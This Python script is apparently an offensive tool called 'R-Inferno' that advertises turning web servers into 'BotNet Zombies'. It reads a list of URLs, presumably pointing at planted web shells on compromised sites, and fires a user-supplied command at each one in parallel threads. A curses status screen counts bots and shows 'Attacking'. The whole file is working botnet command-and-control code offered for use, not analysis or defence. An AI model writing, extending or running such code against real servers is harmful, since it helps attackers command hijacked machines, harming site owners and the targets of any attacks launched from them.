import argparse
import requests
import threading
import time
from termcolor import colored
from urllib.parse import urlparse
import curses

active_bots = 0
remaining_bots = 0

def log_input(input_text):
    modified_text = input_text.replace(' ', '%20')
    with open('.bot.log', 'a') as log_file:
        log_file.write(modified_text + '\n')
    return modified_text

def print_banner(stdscr):
    banner = r"""
        	    ____        ____      ____                    
	           / __ \      /  _/___  / __/__  _________  ____
	          / /_/ /_____ / // __ \/ /_/ _ \/ ___/ __ \/ __ \
	         / _, _/_____// // / / / __/  __/ /  / / / / /_/ /
	        /_/ |_|     /___/_/ /_/_/  \___/_/  /_/ /_/\____/

	            https://github.com/Rezn0y/R-Inferno v1.0.0

	                    Rezn0y: R-Inferno Project
	            Transform Web Servers Into BotNet Zombies.
	                    Manage your zombies. ϟϟ
    """
    stdscr.addstr(0, 0, banner, curses.color_pair(1))

def update_status(stdscr):
    global active_bots, remaining_bots
    stdscr.addstr(20, 0, "Active Bots: ", curses.color_pair(2))
    stdscr.addstr("{}".format(active_bots), curses.color_pair(3))
    stdscr.addstr(" Remaining: ", curses.color_pair(5))
    stdscr.addstr("{}".format(remaining_bots), curses.color_pair(3))
    stdscr.refresh()

def send_request(url, command, stdscr):
    global active_bots
    try:
        response = requests.get(url + command, timeout=5)
        status_code = response.status_code
        active_bots += 1
    except requests.RequestException:
        active_bots += 1
    update_status(stdscr)

def get_domain(url):
    parsed_url = urlparse(url)
    domain = parsed_url.netloc
    return domain

def process_site(url, command, thread_id, stdscr):
    send_request(url, command, stdscr)

def main(stdscr):
    global remaining_bots, active_bots
    curses.start_color()
    curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_WHITE, curses.COLOR_BLACK)
    curses.init_pair(5, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    print_banner(stdscr)
    parser = argparse.ArgumentParser(description="R-Inferno.py")
    parser.add_argument("--list", required=True, help="List of zombies")
    parser.add_argument("--send", required=True, help="Command to send")
    parser.add_argument("--threads", type=int, default=1, help="Number of threads")
    args = parser.parse_args()

    command = log_input(args.send)

    with open(args.list, "r") as file:
        websites = file.read().splitlines()

    remaining_bots = len(websites)
    update_status(stdscr)

    for i, website in enumerate(websites):
        thread = threading.Thread(target=process_site, args=(website, command, i, stdscr))
        thread.start()
        remaining_bots -= 1
        time.sleep(2)
        update_status(stdscr)

    stdscr.clear()
    print_banner(stdscr)
    stdscr.addstr(20, 0, "Attacking: ", curses.color_pair(2))
    stdscr.addstr("{}".format(active_bots), curses.color_pair(3))
    stdscr.addstr(" Starting: ", curses.color_pair(5))
    stdscr.addstr("{}".format(remaining_bots), curses.color_pair(3))
    stdscr.refresh()

    stdscr.addstr(24, 0, "1. Repeat\n2. Exit\n")
    stdscr.refresh()
    choice = stdscr.getch()

    if choice == ord('1'):
        active_bots = 0
        remaining_bots = len(websites)
        main(stdscr)
    elif choice == ord('2'):
        curses.endwin()
        return

if __name__ == "__main__":
    try:
        curses.wrapper(main)
    except curses.error:
        pass
